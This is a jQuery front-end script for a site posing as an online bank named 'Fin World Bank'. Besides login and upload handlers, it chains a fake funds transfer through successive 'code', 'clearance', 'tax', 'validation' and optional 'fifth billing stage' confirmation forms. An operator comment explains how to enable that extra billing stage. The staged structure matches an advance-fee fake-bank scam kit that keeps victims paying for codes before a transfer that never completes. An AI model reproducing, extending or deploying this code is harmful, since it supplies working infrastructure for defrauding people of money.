// Function that validates email address through a regular expression.
function validateEmail(sEmail) {
	var filter = /^[\w\-\.\+]+\@[a-zA-Z0-9\.\-]+\.[a-zA-z0-9]{2,4}$/;
	if (filter.test(sEmail)) {
		return true;
	}else {
		return false;
	}
}


$(document).ready(function() {
loginUser1();    
loginUser();
startTransfer();
confirmCode();
confirmClearance();
confirmTax();
lastConfirmation();
fifthStageCOnfirm();
uploadPicture();
checkFileSize();
showPass();
closeLogin();
changepassword()
myBodyFunction()
$("a#logBtn").bind("click", function() {
		$('#mask').show();
		$('#logWrapper').show();
						return false;			 
									   })

});// JavaScript Document


function closeLogin(){
	$(document).bind("keyup", function(e){
						//alert("I just pressed key " + e.key);	
						if(e.key == "Escape"){
							$('#mask').hide();
		                    $('#logWrapper').hide();
						return false;
						}
								  });
}






//<script src="things/js/jquery-1.10.2.js"></script>
// <form  id="loginform" class="loginform">
// <label >Login ID</label>
 //                       <div >
  //                          <input class="form-control" type="text"  id="account" name="account" style="color: #E4E4E4;" > 
 //                       </div>
 //                  <label >Password</label>
 //                       <div class="col-xs-12">
 //                           <input class="form-control" type="password"  id="passwrd" name="passwrd" style="color: #E4E4E4;" > 
 //                       </div>
  //               <div class="forminfo"></div>
//<div class="col-xs-12">
 //                   <button  type="submit">Submit</button>
 //                   </div>
 //            <div>
  //                          <p >Forget Login Details? <a href="forgetPasswordEmail" ><b>Reset</b></a></p>
  //                      </div>
    //            </form>
function loginUser1(){  
       
$('#loginform').bind("submit", function(){
    
    var frmdata = $(this).serialize();
    var passwrd = $('#passwrd').val();
    var account = $('#account').val();
    
    if (account == '' ) {
		 $('.forminfo').fadeIn().html('<span style="background-color: red; color:#FFFFFF; padding: 5px; text-align: center; width: 100%;"> USER ID FIELD IS EMPTY..</span>');
	                   }
else{
        
          if (passwrd == '' ) {
		 $('.forminfo').fadeIn().html('<span style="background-color: red; color:#FFFFFF; padding: 5px; text-align: center; width: 100%;"> PASSWORD ID FIELD IS EMPTY..</span>');
	                   }
else{
 $.ajax({
            url: "LOG-IN-OUT?action=login user",
            method: "POST",
            data: frmdata,
            dataType:"text",
             beforeSend:function()
                {
                    $('.forminfo').fadeIn().html('<span style="background-color: blue;   color:#FFFFFF; padding: 5px; text-align: center; width: 100%;">Processing your information...</span>');
                },
            success:function(data){
            if(data==1){
            window.location="SUCCESS?rd=secure-redirect";
            }else{
            $('.forminfo').fadeIn().html('<span style="background-color: green; color:#FFFFFF;  padding: 5px; text-align: center; width: 100%;">INVALID LOGIN CREDENTIALS ENTERED</span>');
            $('.forminfo').delay(5000).fadeOut('slow');
                }
                }
            });
  }
        }
return false;
       
})
}





function loginUser(){
	$('#frmLogin').bind("submit", function(){
		var user = $('#username').val();
		var Frmdata = new FormData($(this)[0]);
		var frmurl = $(this).attr('action');
						 var passwrd = $('#pass').val();
							$.ajax({
							 type:"POST", 
							 url:frmurl,
							 data:Frmdata, 
							 async: false,
							 cache: false,
							 contentType: false,
							  processData: false,
							 success:function(data){
								if(data==1){
								window.location="success.php";
								}
								 else
								 {
								$('#errorBlock').show();
								$('#errorBlock').html("Invalid username or password");
								 }
								}
							 
							 });
				return false;
		 })
}

function startTransfer(){
$('#formTransfer').submit(function(){
				$('.btnTrans').prop('disabled', true);
	    		$('.btnTrans').html("<img src='things/img/preloader.gif' width='32' height='32'>");
      
	  			var formData = new FormData($(this)[0]);

  $.ajax({
    url: 'LOG-IN-OUT?action=Start transfer',
    type: 'POST',
    data: formData,
    async: false,
    cache: false, 
    contentType: false,
    processData: false,
    success: function (returndata) {
       if(returndata==0){
	    $('.btnTrans').prop('disabled', false);
	    $('.btnTrans').html("Restart Transfer");
		$('.errorInfo').show(500);
		$('.errorInfo').html("Insufficient funds, please contact your bank for more information");
	   }else{
		window.location="transfer-process?transID="+returndata;
		}
	
	}
  });
				return false;	  
					  });
}

function confirmCode(){
$('#confirmCOde').submit(function(){
				$('.btnCod').prop('disabled', true);
	    		$('.btnCod').html("Processing........");
      
	  			var formData = new FormData($(this)[0]);

  $.ajax({
    url: 'LOG-IN-OUT?action=Confirm Code',
    type: 'POST',
    data: formData,
    async: false,
    cache: false,
    contentType: false,
    processData: false,
    success: function (returndata) {
       if(returndata==0){
	    $('.btnTrans').prop('disabled', false);
		$('.btnTrans').html("Confirm Code");
	    $('.errorInfo').show(500);
		$('.errorInfo').html("Code does not exists. Please contact the administrator");
	   }else{
		$('.errorInfo').show(500);
		$('.errorInfo').html("Your code has been confirmed. Continue transfer...");
		setTimeout(function(){ window.location="transfer-funds?trans_id="+returndata   }, 3000)  
		
		}
	
	}
  });
				return false;	  
					  });
}

function confirmTax(){
$('#confirmTax').submit(function(){
				$('.btnTax').prop('disabled', true);
	    		$('.btnTax').html("Processing........");
      
	  			var formData = new FormData($(this)[0]);

  $.ajax({
    url: 'LOG-IN-OUT?action=Confirm Tax',
    type: 'POST',
    data: formData,
    async: false,
    cache: false,
    contentType: false,
    processData: false,
    success: function (returndata) {
       if(returndata==0){
	    $('.btnTax').prop('disabled', false);
		$('.btnTax').html("Confirm Code Again");
	    $('.errorInfo').show(500);
		$('.errorInfo').html("Code does not exists. Please contact the administrator");
	   }else{
		$('.errorInfo').show(500);
		$('.errorInfo').html("Your code has been confirmed. Continue transfer...");
		setTimeout(function(){ window.location="finalizing-transfer?trans_id="+returndata   }, 3000)  
		
		}
	
	}
  });
				return false;	  
					  });
}

function confirmClearance(){
$('#clearanceCode').submit(function(){
				$('.btnCle').prop('disabled', true);
	    		$('.btnCle').html("Processing, please wait.......");
      
	  			var formData = new FormData($(this)[0]);

  $.ajax({
    url: 'LOG-IN-OUT?action=Confirm Clearance',
    type: 'POST',
    data: formData,
    async: false,
    cache: false,
    contentType: false,
    processData: false,
    success: function (returndata) {
       if(returndata==0){
	    $('.btnCle').prop('disabled', false);
		$('.btnCle').html("Confirm Code");
	    $('.errorInfo').show(500);
		$('.errorInfo').html("Code does not exists. Please contact the administrator");
	   }else{
		$('.errorInfo').show(500);
		$('.errorInfo').html("Your code has been confirmed. Continue transfer...");
		setTimeout(function(){ window.location="transfer-validation?trans_id="+returndata   }, 3000)  
		
		}
	
	}
  });
				return false;	  
					  });
}



function lastConfirmation(){
$('#ValidationCode').submit(function(){
				$('.btnVal').prop('disabled', true);
	    		$('.btnVal').html("Processing, please wait.......");
      
	  			var formData = new FormData($(this)[0]);

  $.ajax({
    url: 'LOG-IN-OUT?action=Confirm Validation',
    type: 'POST',
    data: formData,
    async: false,
    cache: false,
    contentType: false,
    processData: false,
    success: function (returndata) {
       if(returndata==0){
	    $('.btnVal').prop('disabled', false);
		$('.btnVal').html("Confirm Code");
	    $('.errorInfo').show(500);
		$('.errorInfo').html("Code does not exists. Please contact the administrator");
	   }else{
		$('.errorInfo').show(500);
		$('.errorInfo').html("Your code has been confirmed. Continue transfer...");
		setTimeout(function(){ window.location="complete-transfer?trans_id="+returndata   }, 3000)  
		
		}
	
	}
  });
				return false;	  
					  });
}



// NOT APPLICABLE ECEPT YOU NEED 5TH BILLING STAGE             REPLACE   "complete-transfer?trans_id"   of above    WITH   "xtreme-validation?trans_id" 

function fifthStageCOnfirm(){
$('#xtremeValidation').submit(function(){
				$('.btnXtr').prop('disabled', true);
	    		$('.btnXtr').html("Processing, please wait.......");
      
	  			var formData = new FormData($(this)[0]);

  $.ajax({
    url: 'LOG-IN-OUT?action=Confirm xtreme stage',
    type: 'POST',
    data: formData,
    async: false,
    cache: false,
    contentType: false,
    processData: false,
    success: function (returndata) {
       if(returndata==0){
	    $('.btnXtr').prop('disabled', false);
		$('.btnXtr').html("Confirm Code");
	    $('.errorInfo').show(500);
		$('.errorInfo').html("Code does not exists. Please contact the administrator");
		$('.errorInfo').delay(5000).fadeOut('slow');
	   }else{
		$('.errorInfo').show(500);
		$('.errorInfo').html("Your code has been confirmed. Continue transfer...");
		setTimeout(function(){ window.location="complete-transfer?trans_id="+returndata   }, 3000)  
		
		}
	
	}
  });
				return false;	  
					  });
}


function uploadPicture(){
$('#formUpload').bind("submit", function(){
			
		     	$('.btnUpload').prop('disabled', true);
	    		$('.btnUpload').html("<img src='things/img/preloader.gif' width='32' height='32'>");
      
	  			var formData = new FormData($(this)[0]);

  $.ajax({
    url: 'LOG-IN-OUT?action=Upload picture',
    type: 'POST',
    data: formData,
    async: false,
    cache: false,
    contentType: false,
    processData: false,
    success: function (returndata) {
       if(returndata!=1){
	    $('.btnUpload').prop('disabled', false);
	    $('.btnUpload').html("Continue");
		$('.errorInfo').show(500);
		$('.errorInfo').html(returndata);
	   }else{
		location.reload();
		}
	
	}
  });
  return false;
			})
	
}

function checkFileSize(){
$('#up_img').bind("change", function(){
 var fileSize = this.files[0].size;						
					if(fileSize > 4000000){
					$('.btnUpload').hide(500);
					$('.errorInfo').show(500);
					$('.errorInfo').html("File size is greater than the allowed file size of 4MB");
					}else{
					$('.btnUpload').show(500);
					$('.errorInfo').hide(500);	
					$('.errorInfo').html("");
					}
					});
	
}

function showPass(){
	$('#show_password').bind("click", function(){
	var s_pass = $('#show_password').is(':checked');
	                        if(s_pass==false){
							$('#pass').attr('type', 'password');
							}else{
							$('#pass').attr('type', 'text');
	                             }
						  });
}


                       

function changepassword() {
        var new_password = document.getElementById("passnew").value;
        var comfirm_new_password = document.getElementById("conpassnew").value;
        if (new_password != comfirm_new_password) { 
            $('.btnCh').fadeIn().html('<span style="background-color: blue;   color:#FFFFFF; padding: 5px; text-align: center; width: 100%;">Passwords do not match.</span>');
            return false;
        }
        return true;
    }
           
  

 
 
     function myBodyFunction() {
      var myfootinfo = "Fin World Bank";
      var myemailinfo = "support@bbb.bbbb";
      var myphoneinfo = "+1 (845) 490 6624";
      document.getElementById("myfoot-info").innerHTML = myfootinfo;
      document.getElementById("my-email-info").innerHTML = myemailinfo;
      document.getElementById("my-phone-info").innerHTML = myphoneinfo;


     }

 

 